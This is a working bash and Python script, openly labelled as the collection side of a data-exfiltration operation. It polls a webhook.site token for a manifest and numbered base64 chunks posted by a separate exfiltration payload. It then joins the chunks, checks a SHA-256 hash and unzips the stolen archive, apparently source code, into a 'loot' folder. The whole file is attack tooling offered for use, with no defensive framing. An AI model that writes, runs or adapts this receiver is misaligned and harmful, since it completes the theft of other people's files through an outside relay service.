#!/usr/bin/env bash
#
# pull-exfil.sh — reassemble a chunked exfil upload from a webhook.site token.
#
#   ./pull-exfil.sh <token-uuid> [outdir]
#
# The exfil payload POSTs a manifest, numbered base64 chunks, then "done".
# This polls the token's request log, waits for the terminator, concatenates the
# chunks in order, verifies the SHA-256 from the manifest, and unzips.

set -uo pipefail

TOKEN="${1:-}"
OUT="${2:-loot}"
[ -n "$TOKEN" ] || { echo "usage: $0 <webhook.site-token-uuid> [outdir]" >&2; exit 1; }

API="https://webhook.site/token/$TOKEN/requests"
PY="${PYTHON:-python3}"

mkdir -p "$OUT"
echo "[*] polling $API (Ctrl-C to stop)"

for attempt in $(seq 1 120); do
  "$PY" - "$API" "$OUT" <<'PY'
import base64, json, os, sys, urllib.request

api, out = sys.argv[1], sys.argv[2]
try:
    with urllib.request.urlopen(api + "?sorting=newest&per_page=200", timeout=20) as r:
        data = json.load(r)
except Exception as e:
    print("  poll error:", e); raise SystemExit(0)

reqs = data.get("data") or []
seen = set()
for q in reqs:
    path = (q.get("url") or "").rstrip("/").split("/")[-1]
    body = q.get("content") or ""
    if path == "manifest":
        open(os.path.join(out, "manifest.txt"), "w").write(body)
    elif path == "done":
        open(os.path.join(out, ".done"), "w").write("1")
    elif path.startswith("c") and path[1:].isdigit():
        p = os.path.join(out, "chunk-%05d.b64" % int(path[1:]))
        if not os.path.exists(p):
            open(p, "w").write(body)
            seen.add(path)
if seen:
    print("  +%d chunk(s)" % len(seen))
PY

  if [ -f "$OUT/.done" ]; then
    echo "[+] transfer complete"
    break
  fi
  sleep 5
done

[ -f "$OUT/.done" ] || { echo "[!] timed out waiting for 'done'" >&2; exit 1; }

cat "$OUT"/chunk-*.b64 > "$OUT/src.b64"
"$PY" - "$OUT" <<'PY'
import base64, hashlib, os, sys
out = sys.argv[1]
raw = base64.b64decode(open(os.path.join(out, "src.b64")).read())
open(os.path.join(out, "src.zip"), "wb").write(raw)
print("[*] bytes:", len(raw))
man = open(os.path.join(out, "manifest.txt")).read()
for kv in man.split("&"):
    if kv.startswith("sha="):
        want = kv[4:]
        got = hashlib.sha256(raw).hexdigest().upper()
        print("[*] sha256:", "MATCH" if got == want.upper() else "MISMATCH")
PY

cd "$OUT" && unzip -o -q src.zip -d src 2>/dev/null && echo "[+] extracted to $OUT/src"
